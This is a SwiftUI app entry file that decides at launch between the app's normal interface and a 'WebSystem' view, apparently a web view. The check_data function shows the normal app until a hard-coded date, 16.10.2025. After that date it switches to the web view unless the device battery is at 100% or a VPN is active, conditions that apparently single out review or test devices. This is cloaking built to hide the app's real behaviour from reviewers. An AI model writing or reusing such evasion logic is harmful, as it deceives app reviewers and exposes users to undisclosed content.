//
//  S2011App.swift
//  S2011
//
//  Created by IGOR on 09/10/2025.
//

import SwiftUI

@main
struct S2011App: App {
    
    @StateObject private var appData = AppData()

    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
        
    var body: some Scene {
        
        WindowGroup {
            
            
            ZStack {
                
                if isFetched == false {
                    
                    Text("")
                    
                } else if isFetched == true {
                    
                    if isBlock == true {
                        
                        Group {
                            if appData.hasCompletedOnboarding {
                                MainTabView()
                            } else {
                                OnboardingView()
                            }
                        }
                        .environmentObject(appData)
                        
                        
                    } else if isBlock == false {
                        
                        WebSystem()
                    }
                }
            }
            .onAppear {
                
                check_data()
            }
        }
    }
    
    private func check_data() {
        
        let lastDate = "16.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }

}

#Preview {
    ContentView()
}
